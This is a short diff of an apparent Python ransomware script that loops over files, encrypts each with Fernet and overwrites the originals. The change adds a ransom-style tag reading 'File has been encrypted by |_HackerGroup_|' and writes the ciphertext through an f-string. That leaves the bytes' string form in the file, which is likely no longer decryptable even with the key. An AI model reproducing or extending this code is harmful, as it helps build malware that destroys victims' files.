@@ -37,7 +37,7 @@ for file in files:
         #Encrypt data
         encryptedContent = fernet.encrypt(contentOfFiles)
         with open(file, "wb") as theFile:
-            theFile.write(encryptedContent)
+            theFile.write(f"{encryptedContent}\n File has been encrypted by |_HackerGroup_|")
         print(f"Encrypted {file}")
     except Exception as e:
         print(f"Failed to encrypt {file}: {e}")
